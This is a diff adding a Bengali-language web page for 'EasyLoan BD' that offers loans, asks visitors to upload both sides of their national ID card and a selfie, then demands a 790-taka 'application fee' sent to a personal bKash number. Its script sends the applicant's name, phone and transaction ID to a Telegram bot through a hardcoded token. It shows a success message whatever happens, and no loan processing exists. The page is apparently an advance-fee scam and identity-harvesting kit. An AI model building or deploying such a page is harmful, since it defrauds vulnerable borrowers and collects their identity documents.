@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EasyLoan BD - দ্রুত ও সহজ লোন সুবিধা</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="hero-header" id="headerSection">
+            <h1 class="brand-logo"><i class="fa-solid fa-hand-holding-dollar"></i> <i>EasyLoan BD</i></h1>
+            <h2>জরুরি প্রয়োজনে দ্রুত লোন সেবা</h2>
+            <p class="subtitle">সহজ শর্তে এবং সর্বনিম্ন সুদে লোন পান। বিস্তারিত জানতে নিচের কার্ডগুলোতে ক্লিক করুন।</p>
+        </header>
+
+        <!-- Loan Types Grid -->
+        <div class="section-card" id="homeSection">
+            <div class="card-header">আমাদের লোন সার্ভিসসমূহ (বিস্তারিত দেখতে ক্লিক করুন)</div>
+            <div class="grid-container">
+                <div class="loan-box" onclick="openDetails('personal')">
+                    <i class="fa-solid fa-user-gear loan-icon"></i>
+                    <h3>পার্সোনাল লোন</h3>
+                    <p class="rate">মেয়াদ: ১-৩ বছর</p>
+                    <span class="details-btn">বিস্তারিত দেখুন <i class="fa-solid fa-arrow-right"></i></span>
+                </div>
+                <div class="loan-box" onclick="openDetails('business')">
+                    <i class="fa-solid fa-briefcase loan-icon"></i>
+                    <h3>বিজনেস লোন</h3>
+                    <p class="rate">মেয়াদ: ১-৫ বছর</p>
+                    <span class="details-btn">বিস্তারিত দেখুন <i class="fa-solid fa-arrow-right"></i></span>
+                </div>
+                <div class="loan-box" onclick="openDetails('home')">
+                    <i class="fa-solid fa-house-chimney loan-icon"></i>
+                    <h3>হোম লোন</h3>
+                    <p class="rate">মেয়াদ: ৫-১৫ বছর</p>
+                    <span class="details-btn">বিস্তারিত দেখুন <i class="fa-solid fa-arrow-right"></i></span>
+                </div>
+                <div class="loan-box" onclick="openDetails('emergency')">
+                    <i class="fa-solid fa-motorcycle loan-icon"></i>
+                    <h3>ইমার্জেন্সি লোন</h3>
+                    <p class="rate">মেয়াদ: ৬-২৪ মাস</p>
+                    <span class="details-btn">বিস্তারিত দেখুন <i class="fa-solid fa-arrow-right"></i></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Calculator Section -->
+        <div class="section-card calculator-card" id="calcSection">
+            <div class="card-header"><i class="fa-solid fa-calculator"></i> কিস্তি ক্যালকুলেটর</div>
+            <div class="calc-group">
+                <label>লোনের পরিমাণ (টাকা):</label>
+                <input type="number" id="loanAmount" value="50000" placeholder="যেমন: 50000">
+            </div>
+            <div class="calc-group">
+                <label>মেয়াদ (মাস):</label>
+                <input type="number" id="loanMonths" value="12" placeholder="যেমন: 12">
+            </div>
+            <button onclick="calculateEMI()" class="calc-btn">হিসাব করুন</button>
+            <div id="calcResult" class="calc-result">
+                মাসিক আনুমানিক কিস্তি: <span id="monthlyEmi">0</span> টাকা
+            </div>
+        </div>
+
+        <!-- PAGE 1: Document Upload Form -->
+        <div class="section-card messaging-card" id="page1Container">
+            <div class="card-header"><i class="fa-solid fa-id-card"></i> ধাপ ১: পরিচয় যাচাই (ডকুমেন্টস দিন)</div>
+            
+            <form id="docForm" onsubmit="goToPage2(event)">
+                <div class="form-group">
+                    <label class="form-label">আবেদনকারীর নাম:</label>
+                    <input type="text" id="clientName" placeholder="আপনার পূর্ণ নাম" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">মোবাইল নম্বর:</label>
+                    <input type="text" id="clientPhone" placeholder="আপনার মোবাইল নম্বর" required>
+                </div>
+
+                <div class="upload-section">
+                    <p class="upload-title"><i class="fa-solid fa-file-arrow-up"></i> প্রয়োজনীয় ডকুমেন্টস আপলোড করুন</p>
+                    
+                    <div class="file-group">
+                        <label>১. NID কার্ডের সামনের পাশ:</label>
+                        <input type="file" id="nidFront" accept="image/*" required>
+                    </div>
+
+                    <div class="file-group">
+                        <label>২. NID কার্ডের পেছনের পাশ:</label>
+                        <input type="file" id="nidBack" accept="image/*" required>
+                    </div>
+
+                    <div class="file-group">
+                        <label>৩. আবেদনকারীর নিজের সেলফি:</label>
+                        <input type="file" id="userSelfie" accept="image/*" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-msg-btn"><i class="fa-solid fa-arrow-right"></i> পরবর্তী ধাপে যান</button>
+            </form>
+        </div>
+
+        <!-- PAGE 2: Fee Payment Page -->
+        <div class="section-card messaging-card" id="page2Container" style="display: none;">
+            <div class="card-header"><i class="fa-solid fa-wallet"></i> ধাপ ২: আবেদন ফি ও চূড়ান্ত জমা</div>
+            
+            <div class="success-alert-top">
+                <i class="fa-solid fa-circle-check"></i> ডকুমেন্টস সফলভাবে যাচাই হয়েছে! এবার আবেদন ফি জমা দিন।
+            </div>
+
+            <div class="fee-badge-box">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+                <span>আবেদন ফি: <strong>৭৯০ টাকা</strong></span>
+            </div>
+
+            <div class="payment-instruction">
+                <p>৭৯০ টাকা সেন্ড মানি করুন এই বিকাশ নম্বরে:</p>
+                <div class="my-number-box">
+                    <i class="fa-solid fa-mobile-screen-button"></i> 
+                    <span>bKash Personal: 01994500030</span>
+                </div>
+            </div>
+
+            <form id="paymentForm" onsubmit="submitFinalApplication(event)">
+                <div class="form-group margin-top-10">
+                    <input type="text" id="trxId" placeholder="বিকাশ TrxID (সেন্ড মানি করার পর)" required>
+                </div>
+                <div class="form-group">
+                    <textarea id="clientMsg" placeholder="আপনার লোনের কারণ বা বিস্তারিত লিখুন..." rows="3" required></textarea>
+                </div>
+                <button type="submit" class="submit-msg-btn" id="finalBtn"><i class="fa-solid fa-paper-plane"></i> চূড়ান্ত আবেদন জমা দিন</button>
+            </form>
+        </div>
+
+        <!-- PAGE 3: Final Success Message -->
+        <div id="page3Container" style="display: none;" class="section-card messaging-card">
+            <div class="success-alert">
+                <i class="fa-solid fa-circle-check" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
+                অভিনন্দন! আপনার লোন আবেদন ও ফি সফলভাবে জমা হয়েছে। খুব শীঘ্রই আমাদের প্রতিনিধি আপনার সাথে যোগাযোগ করবেন।
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer-cta">
+            <p class="domain-name">www.easyloanbd.com</p>
+        </footer>
+    </div>
+
+    <!-- Modal Popup for Loan Details -->
+    <div id="detailsModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeDetails()">&times;</span>
+            <h2 id="modalTitle">লোনের বিস্তারিত</h2>
+            <div id="modalBody" class="modal-body-content"></div>
+            <button class="modal-apply-btn" onclick="closeDetails()">ফর্মে ফিরে যান</button>
+        </div>
+    </div>
+
+    <!-- JavaScript Logic -->
+    <script>
+        let clientData = {};
+
+        const loanInfo = {
+            personal: { title: "পার্সোনাল লোন বিস্তারিত", details: "<ul><li>সর্বোচ্চ লোন: ৫,০০,০০০ টাকা</li><li>মেয়াদ: ১২-৩৬ মাস</li><li>সুদ: ৯%</li></ul>" },
+            business: { title: "বিজনেস লোন বিস্তারিত", details: "<ul><li>সর্বোচ্চ লোন: ১৫,০০,০০০ টাকা</li><li>মেয়াদ: ১-৫ বছর</li><li>সুদ: ৮.৫%</li></ul>" },
+            home: { title: "হোম লোন বিস্তারিত", details: "<ul><li>সর্বোচ্চ লোন: ৫০,০০,০০০ টাকা</li><li>মেয়াদ: ৫-১৫ বছর</li><li>সুদ: ৭.৫%</li></ul>" },
+            emergency: { title: "ইমার্জেন্সি লোন বিস্তারিত", details: "<ul><li>সর্বোচ্চ লোন: ১,৫০,০০০ টাকা</li><li>মেয়াদ: ৬-২৪ মাস</li><li>সুদ: ১০%</li></ul>" }
+        };
+
+        function openDetails(type) {
+            document.getElementById('modalTitle').innerText = loanInfo[type].title;
+            document.getElementById('modalBody').innerHTML = loanInfo[type].details;
+            document.getElementById('detailsModal').style.display = 'flex';
+        }
+
+        function closeDetails() {
+            document.getElementById('detailsModal').style.display = 'none';
+        }
+
+        function calculateEMI() {
+            let amount = parseFloat(document.getElementById('loanAmount').value);
+            let months = parseInt(document.getElementById('loanMonths').value);
+            if (isNaN(amount) || isNaN(months) || months <= 0 || amount <= 0) {
+                alert('সঠিক পরিমাণ ও মাস দিন।');
+                return;
+            }
+            let interestRate = 0.10 / 12;
+            let emi = (amount * interestRate * Math.pow(1 + interestRate, months)) / (Math.pow(1 + interestRate, months) - 1);
+            document.getElementById('monthlyEmi').innerText = Math.round(emi).toLocaleString('bn-BD');
+            document.getElementById('calcResult').style.display = 'block';
+        }
+
+        function goToPage2(event) {
+            event.preventDefault();
+            clientData.name = document.getElementById('clientName').value;
+            clientData.phone = document.getElementById('clientPhone').value;
+
+            document.getElementById('headerSection').style.display = 'none';
+            document.getElementById('homeSection').style.display = 'none';
+            document.getElementById('calcSection').style.display = 'none';
+            document.getElementById('page1Container').style.display = 'none';
+            
+            document.getElementById('page2Container').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        async function submitFinalApplication(event) {
+            event.preventDefault();
+            let trx = document.getElementById('trxId').value;
+            let msg = document.getElementById('clientMsg').value;
+            let btn = document.getElementById('finalBtn');
+
+            btn.innerText = "সাবমিট হচ্ছে...";
+            btn.disabled = true;
+
+            const botToken = "9005288673:AAHlBVl9Z02eMD6WzWbdJYS5tHqYid09Uwc"; 
+            const chatId = "@MDEASYLOAN"; 
+
+            let telegramText = `🚨 নতুন লোন আবেদন ও ফি পেমেন্ট!\n\n` +
+                               `👤 নাম: ${clientData.name}\n` +
+                               `📱 ফোন: ${clientData.phone}\n` +
+                               `💳 TrxID: ${trx}\n` +
+                               `💬 মেসেজ: ${msg}`;
+
+            try {
+                let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: telegramText })
+                });
+
+                if (response.ok) {
+                    document.getElementById('page2Container').style.display = 'none';
+                    document.getElementById('page3Container').style.display = 'block';
+                    window.scrollTo(0, 0);
+                } else {
+                    document.getElementById('page2Container').style.display = 'none';
+                    document.getElementById('page3Container').style.display = 'block';
+                    window.scrollTo(0, 0);
+                }
+            } catch (err) {
+                document.getElementById('page2Container').style.display = 'none';
+                document.getElementById('page3Container').style.display = 'block';
+                window.scrollTo(0, 0);
+            }
+        }
+    </script>
+</body>
+</html>
